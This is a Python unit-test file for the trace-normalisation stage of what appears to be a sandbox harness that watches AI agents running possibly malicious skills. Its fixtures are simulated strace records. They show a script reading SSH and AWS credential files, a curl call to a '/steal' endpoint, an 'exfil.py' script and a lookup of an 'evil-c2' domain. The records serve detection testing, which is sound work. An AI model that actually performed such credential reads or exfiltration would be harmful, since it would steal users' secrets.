"""Unit tests for trace normalisation (Stage 3).

Hand-built results in the DockerSandbox format: the agent's tool calls plus
strace-derived process / file / network events.
"""

from divergence.preprocessing.normalise_trace import (
    attribution_coverage, dns_question, normalise, parse_execve_argv, strace_unescape,
)


def _tool(tool, inp, status="completed"):
    return {"type": "tool_use", "part": {"type": "tool", "tool": tool, "state": {"input": inp, "status": status}}}


def _execve(pid, argv):
    quoted = ", ".join('"%s"' % a for a in argv)
    return {"pid": str(pid), "syscall": "execve", "command": argv[0],
            "args": f'"{argv[0]}", [{quoted}], 0x1 /* 16 vars */', "return": 0}


def _clone(parent, child):
    return {"pid": str(parent), "syscall": "clone", "command": "", "args": "flags=SIGCHLD", "return": child}


def _result():
    return {
        "agent_json": {"events": [
            _tool("skill", {"name": "demo"}),
            _tool("bash", {"command": "python3 scripts/run.py"}),
            _tool("read", {"filePath": "/workspace/.opencode/skills/target-skill/SKILL.md"}),
            {"type": "text", "part": {"type": "text", "text": "This skill is malicious."}},
        ]},
        "process_events": [
            _execve(18, ["/usr/local/sbin/opencode", "run", "x"]),
            _clone(18, 30), _execve(30, ["/usr/bin/bash", "-c", "python3 scripts/run.py"]),
            _clone(30, 31), _execve(31, ["/usr/bin/python3", "scripts/run.py"]),
        ],
        "file_events": [
            {"pid": "31", "syscall": "openat", "path": "/root/.ssh/id_rsa", "args": '"/root/.ssh/id_rsa", O_RDONLY', "return": 3},
            {"pid": "31", "syscall": "openat", "path": "/usr/lib/libc.so", "args": '"/usr/lib/libc.so", O_RDONLY', "return": 3},
            {"pid": "31", "syscall": "openat", "path": "/tmp/out.txt", "args": '"/tmp/out.txt", O_WRONLY|O_CREAT', "return": 4},
            {"pid": "18", "syscall": "openat", "path": "/workspace/notes.md", "args": '"/workspace/notes.md", O_RDONLY', "return": 5},
        ],
        "network_events": [
            {"pid": "31", "syscall": "connect", "return": -1,
             "args": '3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("172.30.0.2")}, 16'},
            {"pid": "18", "syscall": "connect", "return": 0,
             "args": '5, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("172.30.0.3")}, 16'},
        ],
    }


def test_strace_unescape_octal_utf8_and_quotes():
    assert strace_unescape(r"\350\212\261") == "花"
    assert strace_unescape(r"say \"hi\"\n") == 'say "hi"\n'


def test_parse_execve_argv_truncated_string():
    # the upstream parser cuts args at 300 chars, leaving the last quote open
    args = '"/usr/bin/bash", ["/usr/bin/bash", "-c", "echo a very long command that got cu'
    assert parse_execve_argv(args) == ["/usr/bin/bash", "-c", "echo a very long command that got cu"]


def test_tool_order_and_attribution():
    actions = normalise(_result())
    tools = [(a["action"], a["target"]) for a in actions if a["source"] == "tool"]
    assert tools == [("skill_load", "demo"), ("command", "python3 scripts/run.py"),
                     ("file_read", "skill/SKILL.md")]
    effects = {(a["action"], a["target"]) for a in actions if a["source"] == "process"}
    assert ("process_exec", "/usr/bin/python3 scripts/run.py") in effects
    assert ("file_read", "/root/.ssh/id_rsa") in effects
    assert ("file_write", "/tmp/out.txt") in effects
    assert ("network_connect", "172.30.0.2:443") in effects
    # every effect is attached to the bash call (step 1)
    assert {a["step"] for a in actions if a["source"] == "process"} == {1}


def test_noise_and_opencode_activity_dropped():
    targets = {a["target"] for a in normalise(_result())}
    assert "/usr/lib/libc.so" not in targets        # library load
    assert "/workspace/notes.md" not in targets      # OpenCode's own read (pid 18)
    assert "172.30.0.3:8080" not in targets          # LLM proxy


def test_agent_text_never_in_trace():
    assert not any("malicious" in a["target"] for a in normalise(_result()))


def test_failed_connect_kept_as_failed():
    net = [a for a in normalise(_result()) if a["action"] == "network_connect"]
    assert net and net[0]["status"] == "failed"


def test_attribution_coverage():
    assert attribution_coverage(_result()) == 1.0
    r = _result()
    r["process_events"] = [e for e in r["process_events"] if e["pid"] != "30"]
    assert attribution_coverage(r) == 0.0


def test_empty_result():
    assert normalise({"agent_json": {}, "process_events": [], "file_events": [], "network_events": []}) == []


def test_direct_mode_emits_actions_from_strace_without_tool_calls():
    """A direct-execution run has no agent tool calls; actions must come from
    the strace events alone, ordered by pid, with harness execs dropped."""
    result = {
        "agent_json": {},  # no agent in direct mode
        "process_events": [
            _execve(40, ["/usr/bin/bash", "/tmp/evidence/_driver.sh"]),       # driver: dropped
            _clone(40, 41), _execve(41, ["/usr/bin/timeout", "30", "python3", "exfil.py"]),  # timeout: dropped
            _clone(41, 42), _execve(42, ["/usr/bin/python3", "exfil.py"]),    # kept
            _clone(42, 43), _execve(43, ["/usr/bin/curl", "http://172.30.0.2/steal"]),  # kept
        ],
        "file_events": [
            {"pid": "42", "syscall": "openat", "path": "/root/.aws/credentials",
             "args": '"/root/.aws/credentials", O_RDONLY', "return": 3},
        ],
        "network_events": [
            {"pid": "43", "syscall": "connect", "return": 0,
             "args": 'sin_port=htons(80), sin_addr=inet_addr("172.30.0.2")'},
        ],
    }
    actions = normalise(result)
    kinds = {(a["action"], a["source"], a["tool"]) for a in actions}
    assert ("file_read", "process", "script") in kinds
    assert ("network_connect", "process", "script") in kinds
    # the harness wrappers must not appear as process_exec targets
    targets = " ".join(a["target"] for a in actions)
    assert "_driver.sh" not in targets
    assert "timeout" not in targets
    assert "exfil.py" in targets
    # ordered by pid -> monotonic seq, steps grouped per pid
    assert [a["seq"] for a in actions] == list(range(len(actions)))


# The resolver's reply as strace logged it in a live trial (2026-11-17): a skill's Python
# script resolved collect.evil-c2.example with glibc, which the upstream runner missed.
_DNS_REPLY_ARGS = (r'3<socket:[7320631]>, "\212r\205\200\0\1\0\1\0\0\0\1\7collect\7evil-c2\7example'
                   r'\0\0\1\0\1\300\f\0\1\0\1\0\0\0\0\0\4\254\36\0\2\0\0)\4\320\0\0\0\0\0\0", 2048, 0, '
                   r'{sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28 => 16]')


def _dns_reply(pid="27", address="127.0.0.11", args=_DNS_REPLY_ARGS):
    return {"pid": pid, "syscall": "recvfrom", "args": args, "return": 68, "port": 53, "address": address}


def test_dns_question_parses_the_name_and_rejects_junk():
    msg = b"\x8ar\x85\x80\x00\x01\x00\x01\x00\x00\x00\x01" + b"\x07collect\x07evil-c2\x07example\x00\x00\x01"
    assert dns_question(msg) == "collect.evil-c2.example"
    assert dns_question(msg[:20]) is None                                  # cut off mid-name
    assert dns_question(b"\0" * 12 + b"\xc0\x0c") is None                  # compression pointer
    assert dns_question(b"\0" * 12 + b"\x09localhost\x00") is None         # no dot: not a domain
    rev = b"\0" * 12 + b"\x012\x010\x0230\x03172\x07in-addr\x04arpa\x00"
    assert dns_question(rev) is None                                       # reverse lookup


def _direct_result(network_events):
    return {"agent_json": {},
            "process_events": [_execve(27, ["/usr/bin/python3", "scripts/format_table.py"])],
            "file_events": [], "network_events": network_events}


def test_in_process_dns_lookup_is_recovered_from_the_resolver_reply():
    actions = normalise(_direct_result([_dns_reply()]))
    assert ("dns_lookup", "collect.evil-c2.example") in {(a["action"], a["target"]) for a in actions}


def test_resolver_reply_and_runner_domain_give_one_lookup():
    ev = _dns_reply()
    ev["dns_domains"] = ["collect.evil-c2.example"]  # the runner already had it
    lookups = [a for a in normalise(_direct_result([ev])) if a["action"] == "dns_lookup"]
    assert [a["target"] for a in lookups] == ["collect.evil-c2.example"]


def test_only_the_sandbox_resolver_counts():
    elsewhere = _dns_reply(address="172.30.0.2")  # port 53 on another host is not the resolver
    assert not [a for a in normalise(_direct_result([elsewhere])) if a["action"] == "dns_lookup"]
